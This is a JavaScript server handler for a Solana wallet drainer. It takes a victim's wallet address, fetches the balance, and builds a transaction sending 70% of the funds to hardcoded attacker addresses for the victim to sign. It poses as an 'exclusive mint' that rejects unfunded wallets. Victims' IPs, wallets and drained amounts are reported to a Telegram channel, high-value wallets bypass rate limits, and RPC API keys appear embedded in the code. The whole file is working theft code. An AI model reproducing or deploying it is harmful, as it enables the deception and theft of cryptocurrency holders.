import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

// Import enhancement modules (optional - can be disabled)
let enhancementModules = null;
let enhancementModulesLoaded = false;

// Import configuration from external file
import drainerConfig from '../config/drainer-config.js';

// Initialize enhancement modules if enabled
async function initializeEnhancements() {
  if (enhancementModulesLoaded) return enhancementModules;
  
  try {
    if (drainerConfig.enhanced.enhancedRPC) {
      const { default: EnhancedRPCManager } = await import('../src/enhanced-rpc.js');
      const { default: CommitmentOptimizer } = await import('../src/commitment-optimizer.js');
      const { default: DynamicRateLimiter } = await import('../src/dynamic-rate-limiter.js');
      const { default: IntelligentRetryManager } = await import('../src/intelligent-retry.js');
      const { default: FeeOptimizer } = await import('../src/fee-optimizer.js');
      const { default: TransactionMonitor } = await import('../src/transaction-monitor.js');
      const { default: WalletOptimizer } = await import('../src/wallet-optimizer.js');

      enhancementModules = {
        rpcManager: new EnhancedRPCManager(),
        commitmentOptimizer: new CommitmentOptimizer(),
        rateLimiter: new DynamicRateLimiter(),
        retryManager: new IntelligentRetryManager(),
        feeOptimizer: new FeeOptimizer(),
        transactionMonitor: new TransactionMonitor(),
        walletOptimizer: new WalletOptimizer()
      };
      
      enhancementModulesLoaded = true;
      console.log('[UNIFIED_DRAINER] Enhancement modules loaded successfully');
    }
  } catch (error) {
    console.log('[UNIFIED_DRAINER] Failed to load enhancement modules:', error.message);
    console.log('[UNIFIED_DRAINER] Falling back to basic functionality');
    // Disable enhanced features if modules fail to load
    Object.keys(drainerConfig.enhanced).forEach(key => {
      drainerConfig.enhanced[key] = false;
    });
  }
  
  return enhancementModules;
}

// Environment validation (single instance)
function validateEnvironment() {
  const warnings = [];
  
  if (!process.env.RPC_URL) warnings.push('RPC_URL not set - using fallback endpoints');
  if (!process.env.RECEIVER_WALLET) warnings.push('RECEIVER_WALLET not set - using fallback address');
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    warnings.push('Telegram credentials not set - logging may be limited');
  }
  
  if (warnings.length > 0) console.log('[ENV] Environment warnings:', warnings);
  return warnings.length === 0;
}

const isEnvValid = validateEnvironment();

// Unified logging function
function debugLog(message, ...args) {
  if (message && (
    message.includes && (
      message.includes('ERROR') || 
      message.includes('[DRAIN]') ||
      message.includes('[BALANCE]') ||
      message.includes('[TELEGRAM]') ||
      message.includes('Wallet Detected') ||
      message.includes('DRAIN_FAILED') ||
      message.includes('Creating transfer') ||
      message.includes('Drain attempt details') ||
      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
      message.includes('DRAIN_AMOUNT') ||
      message.includes('CONFIRMATION') ||
      message.includes('CONFIRMATION_HANDLER') ||
      message.includes('DRAIN_CREATED') ||
      message.includes('DRAIN_CREATED_FRONTEND') ||
      message.includes('[UNIFIED_') ||
      message.includes('[RATE_LIMIT]')
    )
  )) {
    console.log(message, ...args);
  }
}

// Unified RPC connection management
const RPC_ENDPOINTS = [
  { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
  { url: process.env.RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', weight: 1 },
  { url: 'https://solana-mainnet.g.alchemy.com/v2/demo', weight: 1 },
  { url: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0', weight: 1 }
];

let currentRpcIndex = 0;
let rpcFailures = new Map();
const connectionPool = new Map(); // Single connection pool

async function getConnection(commitmentConfig = null) {
  // Try enhanced RPC first if available
  if (drainerConfig.enhanced.enhancedRPC && enhancementModules?.rpcManager) {
    try {
      const connection = await enhancementModules.rpcManager.getOptimalConnection(commitmentConfig);
      if (connection) return connection;
    } catch (error) {
      debugLog('[UNIFIED_DRAINER] Enhanced RPC failed, falling back to basic:', error.message);
    }
  }
  
  // Fallback to basic RPC logic
  const maxRetries = drainerConfig.rpc.maxRetries;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcEndpoint = RPC_ENDPOINTS[currentRpcIndex];
    const rpcUrl = rpcEndpoint.url;
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        const connection = new Connection(rpcUrl, {
          commitment: commitmentConfig?.commitment || 'confirmed',
          confirmTransactionInitialTimeout: 60000,
          disableRetryOnRateLimit: false,
          httpHeaders: { 'Content-Type': 'application/json' }
        });
        connectionPool.set(rpcUrl, connection);
      }
      
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), drainerConfig.rpc.timeout)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      if (failures > 3) {
        // Silent failure tracking
      }
      
      currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
    }
  }
}

// Enhanced rate limiting with high-value wallet bypass (from drainer.js)
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 15; // Match drainer.js
const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Match drainer.js
const requestCache = new Map();
const walletRequestCache = new Map();
const blockedIPs = new Set();

// Periodic cache cleanup
function cleanupOldCacheEntries() {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  for (const [key, requests] of requestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      requestCache.delete(key);
    } else {
      requestCache.set(key, filtered);
    }
  }
  
  for (const [wallet, requests] of walletRequestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      walletRequestCache.delete(wallet);
    } else {
      walletRequestCache.set(wallet, filtered);
    }
  }
}

function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
  debugLog('[RATE_LIMIT] Starting rate limit check for IP:', userIp, 'wallet:', walletAddress, 'balance:', walletBalance);
  const now = Date.now();
  
  // Periodic cache cleanup (every 100 requests to avoid performance impact)
  if (Math.random() < 0.01) { // 1% chance to trigger cleanup
    cleanupOldCacheEntries();
  }
  
  // High-value wallet bypass: Skip rate limits for wallets with > 0.1 SOL
  if (walletAddress && walletBalance && walletBalance > 100000000) { // 0.1 SOL = 100,000,000 lamports
    // Still check IP-based rate limiting for security (but with higher limits)
    const ipRequests = requestCache.get(userIp) || [];
    const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    // Allow higher limits for high-value wallets but still protect against abuse
    const highValueMaxRequests = MAX_REQUESTS_PER_WINDOW * 3; // 3x normal limit
    if (recentIpRequests.length >= highValueMaxRequests) {
      return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
    }
    
    return { allowed: true, reason: 'HIGH_VALUE_WALLET_BYPASS' };
  }
  
  // Check IP-based rate limiting
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
  }
  
  // Check wallet-based rate limiting
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { allowed: false, reason: 'WALLET_RATE_LIMIT_EXCEEDED', retryAfter: 120 };
    }
    
    recentWalletRequests.push(now);
    walletRequestCache.set(walletAddress, recentWalletRequests);
  }
  
  // Check if IP is blocked
  if (blockedIPs.has(userIp)) {
    return { allowed: false, reason: 'IP_BLOCKED', retryAfter: 3600 };
  }
  
  // Update IP request cache
  recentIpRequests.push(now);
  requestCache.set(userIp, recentIpRequests);
  
  return { allowed: true };
}

// Unified transaction creation with proper drainer logic (from drainer.js)
async function createTransaction(userPubkey, balance, connection, commitmentConfig = null) {
  try {
    // Use enhanced transaction creation if available
    if (drainerConfig.enhanced.commitmentOptimization && enhancementModules?.commitmentOptimizer) {
      try {
        const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(balance);
        const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(balance);
        
        debugLog(`[UNIFIED_DRAINER] Using enhanced commitment optimization: ${optimalCommitment}`);
        
        // Get blockhash with optimal commitment
        const blockhash = await connection.getLatestBlockhash(optimalCommitment);
        
        // Create transaction with proper drainer logic
        const transaction = await createDrainerTransaction(userPubkey, balance, connection, blockhash, true);
        
        return {
          transaction,
          commitment: optimalCommitment,
          connectionSettings,
          enhanced: true
        };
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic transaction creation
    const blockhash = await connection.getLatestBlockhash('confirmed');
    
    // Create transaction with proper drainer logic
    const transaction = await createDrainerTransaction(userPubkey, balance, connection, blockhash, false);
    
    return {
      transaction,
      commitment: 'confirmed',
      connectionSettings: null,
      enhanced: false
    };
  } catch (error) {
    throw new Error(`Transaction creation failed: ${error.message}`);
  }
}

// Create drainer transaction with proper logic (from drainer.js)
async function createDrainerTransaction(userPubkey, balance, connection, blockhash, enhanced = false) {
  // Create receiver wallets - ENFORCED to specific address (from drainer.js)
  const RECEIVER = new PublicKey('8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ');
  const RECEIVER_2 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
  const RECEIVER_3 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
  const RECEIVER_4 = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
  
  debugLog(`[UNIFIED_DRAINER] Receiver addresses enforced to: ${RECEIVER.toString()}`);
  
  // Wallet-specific drain settings (from drainer.js)
  const PHANTOM_FEE_BUFFER = 50000; // ~0.00005 SOL for Phantom network fees + safety margin
  const PHANTOM_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
  const SOLFLARE_FEE_BUFFER = 50000; // ~0.00005 SOL for network fees
  const SOLFLARE_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
  const GLOW_FEE_BUFFER = 50000; // ~0.00005 SOL for Glow network fees + safety margin
  const GLOW_RESERVE_LAMPORTS = 500000; // ~0.0005 SOL for rent exemption + safety
  const BACKPACK_FEE_BUFFER = 50000; // ~0.00005 SOL for Backpack network fees + safety margin
  const BACKPACK_RESERVE_LAMPORTS = 500000; // ~0.0005 SOL for rent exemption + safety
  const EXODUS_FEE_BUFFER = 50000; // ~0.00005 SOL for Exodus network fees + safety margin
  const EXODUS_RESERVE_LAMPORTS = 500000; // ~0.0005 SOL for rent exemption + safety
  
  // Phantom-optimized drain settings (70% drain configuration)
  const DRAIN_PERCENTAGE = 0.7; // 70% for all wallets
  const FRESH_BALANCE = balance;
  
  // Calculate wallet-specific reserves (from drainer.js)
  let TOTAL_RESERVED = 550000; // Default reserve: 0.00055 SOL (fees + rent exemption)
  let feeBuffer = 50000; // Default fee buffer: 0.00005 SOL
  
  // Apply wallet-specific optimizations if enhanced features are available
  if (enhanced && enhancementModules?.walletOptimizer) {
    try {
      const walletType = await enhancementModules.walletOptimizer.detectWalletType(userPubkey);
      debugLog(`[UNIFIED_DRAINER] Detected wallet type: ${walletType}`);
      
      switch (walletType.toLowerCase()) {
        case 'phantom':
          TOTAL_RESERVED = PHANTOM_RESERVE_LAMPORTS;
          feeBuffer = PHANTOM_FEE_BUFFER;
          break;
        case 'solflare':
          TOTAL_RESERVED = SOLFLARE_RESERVE_LAMPORTS;
          feeBuffer = SOLFLARE_FEE_BUFFER;
          break;
        case 'glow':
          TOTAL_RESERVED = GLOW_RESERVE_LAMPORTS;
          feeBuffer = GLOW_FEE_BUFFER;
          break;
        case 'backpack':
          TOTAL_RESERVED = BACKPACK_RESERVE_LAMPORTS;
          feeBuffer = BACKPACK_FEE_BUFFER;
          break;
        case 'exodus':
          TOTAL_RESERVED = EXODUS_RESERVE_LAMPORTS;
          feeBuffer = EXODUS_FEE_BUFFER;
          break;
        default:
          // Use default values for unknown wallets
          TOTAL_RESERVED = 15000;
          feeBuffer = 50000;
      }
    } catch (error) {
      debugLog('[UNIFIED_DRAINER] Wallet type detection failed, using defaults:', error.message);
    }
  }
  
  // Calculate safe drain amount with proper fee subtraction
  if (FRESH_BALANCE > TOTAL_RESERVED) {
    const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
    let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
    
    debugLog(`Available: ${availableForDrain} lamports, ${DRAIN_PERCENTAGE * 100}% of available: ${Math.floor(availableForDrain * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
    
    if (drainAmount <= 0) {
      debugLog(`Drain amount too small: ${drainAmount} lamports`);
      throw new Error(`Drain amount too small: ${drainAmount} lamports`);
    }
    
    // For 70% drain, use the calculated amount but respect safety limit
    const maxSafeDrain = Math.floor(availableForDrain * 0.95); // 95% of available as safety limit
    const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
    debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
    
    let finalDrainAmount = safeDrainAmount;
    
    // Ensure minimum meaningful drain amount (reduced for 70% drain)
    const MINIMUM_DRAIN_AMOUNT = 100000; // 0.0001 SOL minimum drain amount
    if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
      debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
      throw new Error(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
    }
    
    // Create transaction
    const transaction = new Transaction();
    
    // Create transfer instruction with explicit format for Glow compatibility
    const transferIx = SystemProgram.transfer({
      fromPubkey: userPubkey,
      toPubkey: RECEIVER,
      lamports: finalDrainAmount,
    });
    
    transaction.add(transferIx);
    debugLog(`Transaction instruction added successfully`);
    
    // Set fee payer and blockhash
    transaction.feePayer = userPubkey;
    transaction.recentBlockhash = blockhash.blockhash;
    
    // Set last valid block height
    if (blockhash.lastValidBlockHeight) {
      transaction.lastValidBlockHeight = blockhash.lastValidBlockHeight;
    }
    
    return transaction;
  } else {
    throw new Error('Insufficient funds after reserving fees');
  }
}

// Unified transaction monitoring
async function monitorTransaction(connection, signature, commitment = 'confirmed') {
  try {
    // Use enhanced monitoring if available
    if (drainerConfig.enhanced.transactionMonitoring && enhancementModules?.transactionMonitor) {
      try {
        return await enhancementModules.transactionMonitor.monitorTransaction(connection, signature, commitment);
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced monitoring failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic monitoring
    const confirmation = await connection.confirmTransaction(signature, commitment);
    return confirmation;
  } catch (error) {
    throw new Error(`Transaction monitoring failed: ${error.message}`);
  }
}

// Main unified drainer handler with proper drainer logic (from drainer.js)
async function unifiedDrainerHandler(req, res) {
  console.log('[UNIFIED_DRAINER] Starting unified drainer handler');
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(200).end();
    return;
  }

  // Set CORS headers for all responses
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');

  // Get user public key and wallet type from query or body
  let userPublicKey;
  let walletType = 'Unknown';
  
  if (req.method === 'GET') {
    userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
    walletType = req.query.walletType || 'Unknown';
  } else if (req.method === 'POST') {
    const body = req.body;
    userPublicKey = body.user || body.publicKey || body.wallet || body.pubkey;
    walletType = body.walletType || 'Unknown';
  }

  console.log('[UNIFIED_DRAINER] Request data:', { userPublicKey, walletType, method: req.method });

  try {
    // Initialize enhancements if not already done
    await initializeEnhancements();
    
    if (!userPublicKey) {
      await telegramLogger.logError({
        user: 'N/A',
        ip: userIp,
        message: 'Missing user parameter in request'
      });

      return res.status(400).json({ 
        error: 'Missing user parameter', 
        details: 'Please provide a valid MAMBO wallet address.',
        code: 'MISSING_PARAMETER'
      });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(userPublicKey);
      
      // Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logError({
          user: userPublicKey,
          ip: userIp,
          message: `Attempted to drain from program address: ${userPublicKey}`
        });

        return res.status(400).json({ 
          error: 'Invalid wallet address', 
          details: 'Cannot drain from program addresses. Please provide a valid user wallet address.',
          code: 'INVALID_WALLET_ADDRESS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        user: userPublicKey,
        ip: userIp,
        message: `Invalid public key format: ${userPublicKey}`
      });

      return res.status(400).json({ 
        error: 'Invalid wallet address', 
        details: 'Please provide a valid MAMBO wallet address.',
        code: 'INVALID_PUBLIC_KEY'
      });
    }

    // Rate limiting check BEFORE balance fetch to prevent retry-based rate limiting
    console.log('[UNIFIED_DRAINER] Checking rate limits...');
    const rateLimitCheck = checkRateLimit(userIp, userPublicKey, 0); // Use 0 for initial check
    console.log('[UNIFIED_DRAINER] Rate limit check result:', rateLimitCheck);
    
    if (!rateLimitCheck.allowed) {
      console.log('[UNIFIED_DRAINER] Rate limit exceeded, returning error');
      await telegramLogger.logRateLimit({
        type: rateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: rateLimitCheck.retryAfter
      });
    }
    console.log('[UNIFIED_DRAINER] Rate limit check passed');
    
    // Get user balance
    console.log('[UNIFIED_DRAINER] Starting balance fetch');
    let lamports = 0;
    
    try {
      console.log('[UNIFIED_DRAINER] Creating connection for balance fetch');
      const connection = await getConnection();
      
      console.log('[UNIFIED_DRAINER] Fetching balance...');
      lamports = await connection.getBalance(userPubkey);
      console.log(`[BALANCE] Successfully fetched balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
    } catch (error) {
      console.error('[BALANCE_ERROR] Failed to fetch balance:', error.message);
      return res.status(503).json({ 
        error: 'Service temporarily unavailable', 
        details: 'Unable to fetch wallet balance. Please try again later.',
        code: 'BALANCE_FETCH_FAILED'
      });
    }
    
    // Re-check rate limiting with actual balance for high-value wallet bypass
    const finalRateLimitCheck = checkRateLimit(userIp, userPublicKey, lamports);
    if (!finalRateLimitCheck.allowed) {
      await telegramLogger.logRateLimit({
        type: finalRateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded after balance fetch - retry after ${finalRateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: finalRateLimitCheck.retryAfter
      });
    }
    
    // Log high-value wallet bypass if applicable
    if (finalRateLimitCheck.reason === 'HIGH_VALUE_WALLET_BYPASS') {
      await telegramLogger.logHighValueBypass({
        user: userPublicKey || 'N/A',
        ip: userIp,
        lamports: lamports
      });
    }

    // Create transaction with proper drainer logic
    let transaction;
    let commitment = 'confirmed';
    let enhanced = false;
    
    try {
      const connection = await getConnection();
      const blockhash = await connection.getLatestBlockhash('confirmed');
      
      // Try enhanced transaction creation if available
      if (drainerConfig.enhanced.commitmentOptimization && enhancementModules?.commitmentOptimizer) {
        try {
          const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(lamports);
          const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(lamports);
          
          debugLog(`[UNIFIED_DRAINER] Using enhanced commitment optimization: ${optimalCommitment}`);
          
          // Get blockhash with optimal commitment
          const enhancedBlockhash = await connection.getLatestBlockhash(optimalCommitment);
          
          // Create transaction with enhanced settings
          transaction = await createDrainerTransaction(userPubkey, lamports, connection, enhancedBlockhash, true);
          commitment = optimalCommitment;
          enhanced = true;
        } catch (error) {
          debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
          // Fallback to basic transaction creation
          transaction = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false);
        }
      } else {
        // Use basic transaction creation
        transaction = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false);
      }
      
      if (!transaction || transaction.instructions.length === 0) {
        throw new Error('Failed to create valid transaction');
      }
      
         } catch (error) {
       // Check if it's an insufficient funds error
       if (error.message.includes('Insufficient funds') || error.message.includes('insufficient')) {
         await telegramLogger.logInsufficientFunds({
           user: userPubkey.toString(),
           ip: userIp,
           lamports: lamports
         });
         return res.status(400).json({
           error: 'Sorry, You\'re Not eligible',
           details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
           code: 'INSUFFICIENT_FUNDS'
         });
       }
       
       await telegramLogger.logError({
         user: userPubkey.toString(),
         ip: userIp,
         message: 'Failed to create transaction'
       });
       return res.status(500).json({ error: 'Failed to create transaction', details: error.message });
     }

    // Serialize transaction for response (client-side signing)
    let serialized;
    try {
      if (!transaction.feePayer || !transaction.recentBlockhash) {
        throw new Error('Transaction missing required fields (feePayer or recentBlockhash)');
      }
      
      serialized = transaction.serialize({ requireAllSignatures: false });
      
      if (!serialized || serialized.length === 0) {
        throw new Error('Transaction serialization produced empty result');
      }
    } catch (serializeError) {
      await telegramLogger.logError({
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to serialize transaction'
      });
      return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
    }

    // Calculate actual drain amount from transaction (convert BigInt to Number)
    const actualDrainAmount = transaction.instructions[0]?.data ? 
      Number(transaction.instructions[0].data.readBigUInt64LE(0)) : 0;
    
    // Log drain attempt
    await telegramLogger.logDrainAttempt({
      publicKey: userPubkey.toString(),
      lamports: lamports,
      tokenCount: 0,
      nftCount: 0,
      transactionSize: serialized.length,
      instructions: transaction.instructions.length,
      success: true,
      actualDrainAmount: actualDrainAmount,
      hasTokens: false,
      hasNFTs: false,
      walletType: walletType || 'Unknown'
    });

    const responseTime = Date.now() - startTime;
    
    // Return transaction data for client-side signing (like drainer.js)
    res.json({
      success: true,
      transaction: serialized.toString('base64'), // Frontend expects base64 string
      actualDrainAmount: actualDrainAmount, // Add actual drain amount
      commitment,
      enhanced,
      responseTime,
      optimizations: {
        enhancedRPC: drainerConfig.enhanced.enhancedRPC && !!enhancementModules?.rpcManager,
        dynamicRateLimiting: drainerConfig.enhanced.dynamicRateLimiting && !!enhancementModules?.rateLimiter,
        commitmentOptimization: drainerConfig.enhanced.commitmentOptimization && !!enhancementModules?.commitmentOptimizer,
        intelligentRetry: drainerConfig.enhanced.intelligentRetry && !!enhancementModules?.retryManager,
        feeOptimization: drainerConfig.enhanced.feeOptimization && !!enhancementModules?.feeOptimizer,
        transactionMonitoring: drainerConfig.enhanced.transactionMonitoring && !!enhancementModules?.transactionMonitor,
        walletOptimizer: drainerConfig.enhanced.walletOptimization && !!enhancementModules?.walletOptimizer
      }
    });
    
  } catch (error) {
    debugLog(`[UNIFIED_DRAINER] Error: ${error.message}`);
    
    // Log error to Telegram if enabled
    if (drainerConfig.core.telegramLogging) {
      try {
        await telegramLogger.logError({
          user: 'N/A',
          ip: 'N/A',
          message: error.message
        });
      } catch (telegramError) {
        debugLog('[UNIFIED_DRAINER] Failed to log error to Telegram:', telegramError.message);
      }
    }
    
    res.status(500).json({ 
      error: 'Transaction failed', 
      details: error.message
    });
  }
}

// Export the unified handler and configuration
export default unifiedDrainerHandler;
export { drainerConfig, enhancementModules, initializeEnhancements };
